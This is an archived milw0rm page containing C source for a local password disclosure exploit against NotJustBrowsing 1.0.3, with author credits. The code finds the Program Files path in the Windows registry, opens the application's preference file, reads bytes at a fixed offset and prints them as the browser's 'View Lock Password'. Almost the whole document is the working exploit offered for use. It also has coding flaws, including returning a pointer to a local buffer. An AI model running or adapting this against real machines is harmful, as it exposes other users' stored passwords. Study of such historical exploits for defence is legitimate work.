<html>
<head>
<title>NotJustBrowsing 1.0.3 Local Password Disclosure Exploit</title>
<pre>
/*****************************************************************

NotJustBrowsing 1.0.3 Local Password Disclosure Exploit by Kozan

Application: NotJustBrowsing 1.0.3
Procuder: www.notjustbrowsing.com
Vulnerable Description: NotJustBrowsing 1.0.3 discloses passwords
to local users.

Discovered &amp; Coded by Kozan
Credits to ATmaCA
www.netmagister.com - www.spyinstructors.com
kozan@netmagister.com

*****************************************************************/

#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;


HKEY hKey;
#define BUFSIZE 100
char prgfiles[BUFSIZE];
DWORD dwBufLen=BUFSIZE;
LONG lRet;


char *bilgi_oku(int adres,int uzunluk)
{
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,
					&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion&quot;,
					0,
					KEY_QUERY_VALUE,
					&amp;hKey
					) == ERROR_SUCCESS)
	{

	lRet = RegQueryValueEx( hKey, &quot;ProgramFilesDir&quot;, NULL, NULL,(LPBYTE) prgfiles,
&amp;dwBufLen);
	if( (lRet != ERROR_SUCCESS) || (dwBufLen &gt; BUFSIZE) )
	{
		RegCloseKey(hKey);
		return NULL;
	}
	RegCloseKey(hKey);

	strcat(prgfiles,&quot;\\NetLeaf Limited\\NotJustBrowsing\\notjustbrowsing.prf&quot;);

	int i;
	FILE *fp;
	char ch[100];
	if((fp=fopen(prgfiles,&quot;rb&quot;)) == NULL)
	{
		return &quot;NOTINSTALLED&quot;;
	}
	fseek(fp,adres,0);
	for(i=0;i&lt;uzunluk;i++)
	ch[i]=getc(fp);
	ch[i]=NULL;
	fclose(fp);
	return ch;
	}
}

int main()
{
	printf(&quot;NotJustBrowsing 1.0.3 Local Password Disclosure Exploit by Kozan\n&quot;);
	printf(&quot;Credits to ATmaCA\n&quot;);
	printf(&quot;www.netmagister.com - www.spyinstructors.com\n&quot;);
	printf(&quot;kozan@netmagister.com\n\n&quot;);
	if(bilgi_oku(4,3)==NULL)
	{
		printf(&quot;An error occured!\n&quot;);
		return -1;
	}
	if(bilgi_oku(4,3)==&quot;NOTINSTALLED&quot;)
	{
		printf(&quot;NotJustBrowsing 1.0.3 is not installed on your system!\n&quot;);
		return -1;
	}
	printf(&quot;View Lock Password: %s&quot;,bilgi_oku(4,3));
	return 0;
}</pre>
// milw0rm.com [2005-04-28]
</html>

